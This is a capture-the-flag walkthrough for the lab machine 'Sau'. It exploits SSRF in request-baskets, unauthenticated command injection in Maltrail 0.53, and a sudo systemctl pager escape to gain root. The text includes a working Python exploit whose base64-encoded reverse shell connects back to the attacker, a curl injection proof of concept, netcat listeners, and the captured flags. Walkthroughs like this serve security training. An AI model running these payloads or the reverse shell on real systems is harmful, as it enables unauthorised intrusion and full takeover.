# Sau

*Linux* - features a "Request Baskets" instance that is vulnerable to SSRF via CVE-2023-27163. Leveraging the vulnerability we are to gain access to a `Maltrail` instance that is vulnerable to Unauthenticated OS Command Injection, which allows us to gain a reverse shell on the machine as `puma`. A `sudo` misconfiguration is then exploited to gain a `root` shell.

-----------

## Task 1

Which is the highest open TCP port on the target machine?

## Solution 1

Start the `nmap` scan:

```sh
nmap -sC -sV -T4 10.10.11.224
```

This provides the following open ports:

```sh
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp    filtered http
55555/tcp open     http    Golang net/http server
```

So the answer is `55555`.

------------

## Task 2

What is the name of the open source software that the application on 55555 is "powered by"?

## Solution 2

When we visit the page on the port `55555` in the footer there is `Powered by request-baskets`.

------------

## Task 3

What is the version of request-baskets running on Sau?

## Solution 3

In the footer there is also the version, which is 1.2.1.

----------

## Task 4

What is the 2023 CVE ID for a Server-Side Request Forgery (SSRF) in this version of request-baskets?

## Solution 4

The vulnerability for this version of the request-basket is `# CVE-2023-27163`.

------------

## Task 5

What is the name of the software that the application running on port 80 is "powered by"?

## Solution 5

We can't directly access the site at this port, as it was also shown on the `nmap` scan, it is `filtered`.

But when I read more about the vulnerability from the `Task 4` it says that exploiting it, it will enable to forward HTTP requests to an internal/private HTTP service. 

So, I can use this to access the port 80.

First let's test it if it works.

We create a new basket on the web-page, and then create to that basket, and click on the `settings` icon.

There we see an option to `Forward URL` and put there our ip with the port 4444.

Start a listening service:

```sh
nc -nlvp 4444
```

Then on the web-page there is a link to the basket. In my case it was `http://10.10.11.224:55555/jl16p9c`, and when I visit that, I see the request on my listening service.

```sh
nc -nlvp 4444
Connection from 10.10.11.224:41240
GET / HTTP/1.1
Host: 10.10.14.37:4444
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Priority: u=0, i
Upgrade-Insecure-Requests: 1
X-Do-Not-Forward: 1
```

Now, instead of the ip of my machine, let's put there the localhost ip `127.0.0.1`, with the port 80, which was filtered, and visit the basket.

Click on `Proxy Response` which *proxies the response from the forward URL back to the client*.

When I visit the link of that basket, it opens the page with the port 80, and in the footer it says `Powered by Maltrail (v0.53)`.

--------------

## Task 6

There is an unauthenticated command injection vulnerability in MailTrail v0.53. What is the relative path on the webserver targeted by this exploit?

## Solution 6

A PoC for this vulnerability is as follows.

```sh
curl 'http://hostname:port/login' --data 'username=;`id > /tmp/bbq`'
```

This can be used by injecting OS commands into the username parameter, which will be executed with the privileges of the running process. It can be exploited remotely without authentication.

From this we can see also the answer to the task, which is `/login`.

## Task 7

Submit the flag located in the puma user's home directory.

## Solution 7

I will use the following PoC found on `ExploitDB` to gain RCE.

```python
import sys;
import os;
import base64;

def main():
	listening_IP = None
	listening_PORT = None
	target_URL = None

	if len(sys.argv) != 4:
		print("Error. Needs listening IP, PORT and target URL.")
		return(-1)
	
	listening_IP = sys.argv[1]
	listening_PORT = sys.argv[2]
	target_URL = sys.argv[3] + "/login"
	print("Running exploit on " + str(target_URL))
	curl_cmd(listening_IP, listening_PORT, target_URL)

def curl_cmd(my_ip, my_port, target_url):
	payload = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{my_ip}",{my_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
	encoded_payload = base64.b64encode(payload.encode()).decode()  # encode the payload in Base64
	command = f"curl '{target_url}' --data 'username=;`echo+\"{encoded_payload}\"+|+base64+-d+|+sh`'"
	os.system(command)

if __name__ == "__main__":
  main()
```

via the following command:

```sh
python3 exploit.py [listening_IP] [listening_PORT] [URL of the basket collector]
```

Start a listening service:

```sh
nc -nlvp 1235
```

On the settings of the basket, alongside `Proxy Response` click also the `Expand Forward Path`.

Run the exploit script:

```sh
python3 Maltrail_0.53_exploit.py 10.10.14.37 4444 http://10.10.11.224:55555/jl16p9c
```

And there is the shell on the listening service.

```sh
nc -nlvp 1235
Connection from 10.10.11.224:53666
$ whoami
whoami
puma
```

----------------

## Task 8

Submit the flag located in the puma user's home directory.

## Solution 8

Navigate to:

```sh
cd /home/puma
```

List the files:

```sh
ls
user.txt
```

Read the file, which shows the flag:

```sh
cat user.txt
cde3c48a802a299089d5eb4bac0153bf
```

----------

## Task 9

What is the full path to the binary (without arguments) the puma user can run as root on Sau?

## Solution 9

The following command to show which apps the user can run as root.

```sh
sudo -l

Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

```

So the answer is `/usr/bin/systemctl`.

-------------
## Task 10

What is the full version string for the instance of systemd installed on Sau?

## Solution 10

Run the following command to show the version.

```sh
systemd --version

systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```

So the answer is `systemd 245 (245.4-4ubuntu3.22)`.

-----------

## Task 11

What is the 2023 CVE ID for a local privilege escalation vulnerability in this version of systemd?

## Solution 11

If we search for `/usr/bin/systemctl status trail.service exploit cve` there is the vulnerability `CVE-2023-26604` shown, which is the answer to the question.

-----------

## Task 12

Submit the flag located in the root user's home directory.
## Solution 12

The vulnerability together with the miisconfiguration in `/etc/sudoers` allows for local privilege escalation, since `systemd` doesn't set `LESSECURE` to 1 so the programs may be launched from the `Less` pager.

Run this command:

```sh
sudo /usr/bin/systemctl status trail.service

WARNING: terminal is not fully functional
-  (press RETURN)
```

Here instead of return, write `!/bin/bash`, which gives root access.

This because we instruct the pager to suspend the current operation and execute the command, opening a shell with the same privileges as the pager itself.

The navigate to:

```sh
cd /root/
```

List the files:

```sh
ls
go  root.txt
```

```sh
cat root.txt
46198c8cc2dd77b28a5844d2c5c9298d
```